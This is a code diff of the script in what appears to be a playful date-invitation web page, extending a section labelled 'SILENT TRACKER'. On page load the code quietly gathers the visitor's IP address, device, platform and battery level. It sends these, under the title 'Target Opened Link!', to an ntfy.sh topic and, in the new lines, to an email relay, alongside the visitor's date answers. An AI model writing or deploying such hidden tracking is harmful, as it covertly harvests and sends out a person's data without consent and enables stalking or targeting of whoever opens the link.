@@ -173,7 +173,6 @@
       // --- SILENT TRACKER ---
       async function captureVisitor() {
         try {
-          // Grab IP Address
           let ip = "Unknown IP";
           try {
             const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -181,10 +180,8 @@
             ip = ipData.ip;
           } catch(e) {}
 
-          // Get User Agent
           const ua = navigator.userAgent || "Unknown Device";
           
-          // Try to get battery info
           let batteryStr = "Unknown";
           if (navigator.getBattery) {
             try {
@@ -198,11 +195,25 @@
 
           const trackBody = `🚨 NEW VISITOR\nIP: ${ip}\nPlatform: ${platform}\nBattery: ${batteryStr}\nTime: ${time}\nUA: ${ua}`;
           
-          // Push payload to ntfy quietly
-          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("Target Opened Link!"), {
+          // 1. Push payload to ntfy quietly (Desktop popup)
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🚨 Target Opened Link!"), {
             method: "POST",
             mode: "no-cors",
             body: trackBody
+          }).catch(() => {});
+
+          // 2. Push payload via FormSubmit (Email delivery)
+          fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept": "application/json" },
+            body: JSON.stringify({
+              _subject: "🚨 Target Opened Link!",
+              IP_Address: ip,
+              Platform: platform,
+              Battery_Level: batteryStr,
+              Time_Opened: time,
+              Device_Info: ua
+            })
           }).catch(() => {});
 
         } catch(e) {}
@@ -211,7 +222,6 @@
       // Execute tracker immediately when the page loads
       captureVisitor();
       // ----------------------
-
 
       // Secret Note Modal
       const noteBtn = document.getElementById("noteBtn");
@@ -275,7 +285,7 @@
       // Wax Seal Unlock & Dispatch
       const sealStage = document.getElementById("sealStage");
       const sealHint = document.getElementById("sealHint");
-      let isSealed = false; // Anti-spam lock
+      let isSealed = false; 
 
       sealStage.addEventListener("click", () => {
         if (isSealed) return;
@@ -312,7 +322,7 @@
           }, 250);
 
           // 1. Final ticket ntfy bypass
-          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?email=Kali0x0x@proton.me&title=" + encodeURIComponent("🤍 Romantic Date Confirmed!"), {
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🤍 Romantic Date Confirmed!"), {
             method: "POST",
             mode: "no-cors",
             body: `🤍 DATE ACCEPTED!\nDate: ${date}\nTime: ${time}\nDining: ${food}\nPlan: ${act}\nNotes: ${notes}`
